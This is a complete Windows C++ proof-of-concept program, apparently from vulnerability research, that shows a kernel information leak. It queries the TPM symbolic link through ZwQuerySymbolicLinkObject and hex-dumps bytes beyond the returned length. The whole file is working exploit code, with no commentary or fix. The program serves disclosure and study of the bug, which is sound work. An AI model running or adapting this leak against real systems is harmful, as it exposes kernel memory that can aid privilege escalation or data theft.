// TPM_Disclosure.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "windows.h"
#include "Header.h"


void POC_TPM_Disclosure()
{
	wchar_t* SymName = L"\\GLOBAL??\\TPM";
	_UNICODE_STRING UNI_SL = {0};		
	UNI_SL.Length=wcslen(SymName)*2;
	UNI_SL.MaxLength= UNI_SL.Length + 2;
	UNI_SL.Buffer=SymName;
	_OBJECT_ATTRIBUTES ObjAttr_SL = {sizeof(ObjAttr_SL)};
	ObjAttr_SL.ObjectName=&UNI_SL;
	ObjAttr_SL.Attributes=0x40;
	HANDLE hSym = 0;
	int ret = ZwOpenSymbolicLinkObject(&hSym,GENERIC_READ,&ObjAttr_SL);
	printf("ZwOpenSymbolicLinkObject, ret: %X\r\n",ret);
	if(ret >= 0)
	{
		wchar_t* pTarget = (wchar_t*)LocalAlloc(LMEM_ZEROINIT,MAX_UNICODE_STRING_LENGTH);
		if(!pTarget)
		{
			printf("Error allocating memory for target name\r\n");
		}
		else
		{
			memset(pTarget,0xCC,MAX_UNICODE_STRING_LENGTH);
			_UNICODE_STRING uniTarget = {0};
			uniTarget.Length = MAX_UNICODE_STRING_LENGTH - 2;
			uniTarget.MaxLength = MAX_UNICODE_STRING_LENGTH;
			uniTarget.Buffer = pTarget;

			ulong RetLength = 0;
			ret = ZwQuerySymbolicLinkObject(hSym,&uniTarget,&RetLength);
			printf("ZwQuerySymbolicLinkObject, ret: %X\r\n",ret);
			if(ret >= 0)
			{
					printf("Length: %X\r\n",uniTarget.Length);
					printf("MaxLength: %X\r\n",RetLength);

					DumpHex(pTarget,RetLength+0x4);
			}
			LocalFree(pTarget);
		}
		ZwClose(hSym);
	}
	return;
}
int _tmain(int argc, _TCHAR* argv[])
{
	POC_TPM_Disclosure();
	return 0;
}

